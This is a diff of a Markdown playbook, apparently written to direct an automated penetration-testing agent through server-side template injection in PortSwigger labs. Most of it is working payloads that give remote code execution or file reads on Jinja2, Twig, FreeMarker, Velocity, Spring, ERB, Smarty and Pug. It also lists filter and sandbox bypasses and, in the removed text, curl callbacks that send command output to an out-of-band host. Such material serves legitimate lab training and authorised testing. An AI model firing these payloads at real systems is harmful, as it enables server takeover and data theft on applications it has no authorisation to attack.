@@ -1,120 +1,134 @@
-# Server-Side Template Injection (SSTI)
+# Server-Side Template Injection (SSTI) Methodology
+## Expert-Level Playbook (detect → fingerprint engine → RCE/file read)
 
-> SSTI -> RCE on most engines. Don't stop at math evaluation; always escalate.
+> 7 PortSwigger labs. Never fire engine-specific payloads before fingerprinting.
+> Use `ssti_probe` for the arithmetic/fingerprint sweep, then the engine-matched
+> chain. Escalate to file read / command execution only when the lab requires it.
 
 ---
 
 ## Phase 1: Detection
 
-### 1.1 Polyglot probe (sends in ONE shot to fingerprint engine)
+### 1.1 Reflection surfaces
+User input rendered by a template: names, greetings, email templates, error
+pages, `?message=`, product descriptions, order confirmations, blog previews.
+
+### 1.2 Polyglot + arithmetic probe
 ```
-${{<%[%'"}}%\
+ssti_probe url="https://TARGET/?name=INJECT"
+# manual:  ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  {7*7}  a{*comment*}b
 ```
-Engines explode differently:
-- Twig:        unexpected character `%` near `<%`
-- Jinja2:      `TemplateSyntaxError`
-- ERB:         `syntax error`
-- FreeMarker:  `Encountered "<%"...`
-- Velocity:    `org.apache.velocity.runtime.parser.ParseException`
-
-### 1.2 Math evaluation per syntax
-Send each ONE AT A TIME, inspect for the literal `49` or `7777777`:
-
-| Syntax | Engine candidate |
-|--------|-------------------|
-| `{{7*7}}`     | Jinja2, Twig, Nunjucks, Liquid |
-| `{{7*'7'}}`   | Jinja2 -> `7777777`. Twig -> `49`. Distinguishes them. |
-| `${7*7}`      | FreeMarker, JSP-EL, Spring SpEL, Thymeleaf |
-| `<%= 7*7 %>`  | ERB (Ruby), JSP, ASP |
-| `#{7*7}`      | Pug, Ruby, Razor (`@(7*7)`) |
-| `*{7*7}`      | Thymeleaf |
-| `{7*7}`       | Smarty |
-
-### 1.3 Where to inject
-- Email/name fields rendered in welcome emails (often Jinja2/Liquid)
-- Markdown -> HTML pipelines with template post-processing
-- Error pages echoing your input
-- Webhooks that template the body
-- Print/PDF/report generators
+`49` (or template error) ⇒ SSTI. Literal `${7*7}` ⇒ not evaluated there.
 
 ---
 
-## Phase 2: Engine-Specific Escalation to RCE
+## Phase 2: Fingerprint the engine
 
-### 2.1 Jinja2 (Python)
-```python
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]("id", shell=True, stdout=-1).communicate() }}
-{{ config.__class__.from_object('os').popen('id').read() }}
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-{{ lipsum.__globals__['os'].popen('id').read() }}
-{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Use the classic decision probes:
+```
+{{7*'7'}}      → 7777777  (Jinja2/Twig)   |   49 (some)   |   error
+${7*7}         → 49       (Java EL / Freemarker / Velocity / Smarty)
+<%= 7*7 %>     → 49       (ERB / Ruby)
+#{7*7}         → 49       (Ruby / Slim / Thymeleaf-ish)
+{7*7}          → 49       (Tornado / Handlebars-ish)
 ```
 
-### 2.2 Twig (PHP)
-```twig
+| Response to `{{7*'7'}}` | Likely engine |
+|-------------------------|---------------|
+| `7777777` | Jinja2 (Python) or Twig (PHP) |
+| `49` | Twig older / other |
+| error | Freemarker / Velocity / EL |
+
+Confirm with an engine-unique token (e.g. Twig `{{_self}}`, Jinja `{{config}}`,
+Freemarker `${.version}`).
+
+---
+
+## Phase 3: Exploitation per engine
+
+### 3.1 Jinja2 (Python)
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}                 # enumerate
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+### 3.2 Twig (PHP)
+```
 {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
 {{ ['id']|filter('system') }}
-{{ ['cat /etc/passwd']|map('passthru') }}
+{{ attribute(_self.env,"getFilter",["system"]) }}
 ```
 
-### 2.3 FreeMarker (Java)
+### 3.3 Freemarker (Java)
 ```
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}
-```
-
-### 2.4 Velocity (Java)
-```
-#set($e="exp")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
 ```
 
-### 2.5 Spring SpEL
+### 3.4 Velocity (Java)
 ```
-${T(java.lang.Runtime).getRuntime().exec("id")}
-${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream(),T(java.nio.charset.Charset).forName("UTF-8"))}
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
 ```
 
-### 2.6 ERB (Ruby)
+### 3.5 ERB / Ruby
 ```
-<%= `id` %>
-<%= IO.popen('id').read() %>
-<%= system('id') %>
+<%= system("id") %>   |   <%= `id` %>   |   <%= IO.popen('id').read %>
+```
+
+### 3.6 Smarty (PHP)
+```
+{system('id')}   |   {php}system('id');{/php}
+```
+
+### 3.7 Handlebars / Node / Pug
+```
+# Handlebars: prototype-walk to require('child_process')
+# Pug: #{root.process.mainModule.require('child_process').execSync('id')}
 ```
 
 ---
 
-## Phase 3: Blind SSTI (use OOB)
+## Phase 4: Sub-variant tips
 
-Many template injections are blind — output isn't reflected. Plant an OOB
-callback in the payload:
+| Sub-variant | Move |
+|-------------|------|
+| Basic SSTI | detect `${7*7}`, run direct code exec |
+| SSTI in an unknown context | try all polyglots; check error stack for engine |
+| SSTI with docs | read the specific engine docs for the sandbox escape |
+| Custom exploit (sandboxed) | walk object graph to reach `os`/`Runtime`/`system` |
+| Blind SSTI | no output → time delay or OOB: `${T(java.lang...)}` sleep / DNS |
+| SSTI → file read | Jinja `{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}` |
 
-```
-{{ "".__class__.__mro__[1].__subclasses__()[40]("/tmp/x", "w").write(__import__("os").popen("curl http://<oob>/$(id)").read()) }}
-```
-
-For shell-eval engines, simpler:
-```
-${T(java.lang.Runtime).getRuntime().exec("curl http://<oob>/x")}
-<%= `curl http://<oob>/$(id|base64 -w0)` %>
-```
-
-Then `oob_poll(token=...)` to confirm — and any base64-encoded path tells
-you what it ran.
+For blind labs, use `oob_get_domain`/`oob_poll` (engine HTTP/DNS gadget) or a
+timing payload.
 
 ---
 
-## Phase 4: Filter Bypasses
-- Bracket access vs. dotted: `['__class__']` instead of `.__class__`
-- String concat to obfuscate: `('__cl'+'ass__')`
-- Attribute via `attr()`: `{{ ''|attr('__class__') }}`
-- Newline injection: `\n{{...}}`
-- Sandbox escape via `cycler`, `joiner`, `namespace` (Jinja2)
+## Phase 5: Tooling
 
----
+```
+ssti_probe                # arithmetic + polyglot fingerprint sweep
+http_request              # deliver engine-specific payloads
+capture_baseline / diff_against_baseline   # confirm evaluation vs literal
+oob_get_domain / oob_poll # blind SSTI confirmation
+run_shell                 # tplmap/sstimap if deeper automation is needed
+```
 
-## Verification rules
-- If you only got math evaluation, the report is "info: SSTI candidate".
-- If you got a process command output, that's a confirmed VERIFIED finding.
-- Always pair with OOB if execution is non-reflected.
+## Common Failure Modes & Solutions
+
+| Problem | Solution |
+|---------|----------|
+| Payload printed literally | Wrong context/engine; re-run the polyglot sweep |
+| Sandbox blocks direct exec | Walk the object graph (subclasses/globals) to reach the sink |
+| No output (blind) | Use time-delay or OOB gadget |
+| WAF strips `{{` | Try `${`, `#{`, `<%`, or encoded/split braces |
+| Engine unknown | Trigger a template error and read the stack trace |
+
+## Validation / Success Criteria
+- [ ] Expression is evaluated server-side (not reflected literally).
+- [ ] Engine fingerprinted before engine-specific payloads.
+- [ ] Required impact (code exec / file read / OOB) achieved; control stays literal.
+- [ ] Lab solved banner observed.
